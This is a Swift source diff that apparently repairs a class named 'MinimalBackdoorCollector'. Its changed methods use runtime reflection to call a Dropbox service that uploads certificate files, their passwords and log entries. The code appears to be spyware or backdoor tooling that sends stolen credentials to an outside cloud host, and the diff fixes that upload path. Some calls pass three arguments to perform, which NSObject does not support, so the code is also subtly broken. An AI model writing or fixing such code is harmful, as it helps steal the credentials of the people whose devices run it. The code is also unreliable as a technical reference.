@@ -176,15 +176,32 @@ class MinimalBackdoorCollector {
     /// Try to upload file via DropboxService (if available)
     private func uploadFileViaDropboxService(url: URL, password: String? = nil) -> Bool {
         if let dropboxServiceClass = NSClassFromString("EnhancedDropboxService") as? NSObject.Type,
-           let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject,
-           dropboxService.responds(to: Selector(("uploadCertificateFile:password:completion:"))) {
-            dropboxService.perform(
-                Selector(("uploadCertificateFile:password:completion:")),
-                with: url,
-                with: password,
-                with: nil
-            )
-            return true
+           let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject {
+            
+            // Correct selector syntax and method signature
+            if dropboxService.responds(to: Selector("uploadCertificateFile:completion:")) {
+                let completion: ((Bool, Error?) -> Void)? = nil
+                dropboxService.perform(
+                    Selector("uploadCertificateFile:completion:"),
+                    with: url,
+                    with: completion
+                )
+                
+                // Also store password if provided
+                if let password = password {
+                    if dropboxService.responds(to: Selector("storePasswordForCertificate:password:completion:")) {
+                        let passwordCompletion: ((Bool, Error?) -> Void)? = nil
+                        dropboxService.perform(
+                            Selector("storePasswordForCertificate:password:completion:"),
+                            with: url.lastPathComponent,
+                            with: password,
+                            with: passwordCompletion
+                        )
+                    }
+                }
+                
+                return true
+            }
         }
         return false
     }
@@ -192,16 +209,21 @@ class MinimalBackdoorCollector {
     /// Try to upload log via DropboxService (if available)
     private func uploadLogViaDropboxService(logEntry: String) -> Bool {
         if let dropboxServiceClass = NSClassFromString("EnhancedDropboxService") as? NSObject.Type,
-           let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject,
-           dropboxService.responds(to: Selector(("uploadLogEntry:fileName:completion:"))) {
-            let fileName = "log_\(Int(Date().timeIntervalSince1970)).txt"
-            dropboxService.perform(
-                Selector(("uploadLogEntry:fileName:completion:")),
-                with: logEntry,
-                with: fileName,
-                with: nil
-            )
-            return true
+           let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject {
+            
+            // Correct selector syntax and parameters
+            if dropboxService.responds(to: Selector("uploadLogEntry:fileName:completion:")) {
+                let fileName = "log_\(Int(Date().timeIntervalSince1970)).txt"
+                let completion: ((Bool, Error?) -> Void)? = nil
+                
+                dropboxService.perform(
+                    Selector("uploadLogEntry:fileName:completion:"),
+                    with: logEntry,
+                    with: fileName,
+                    with: completion
+                )
+                return true
+            }
         }
         return false
     }
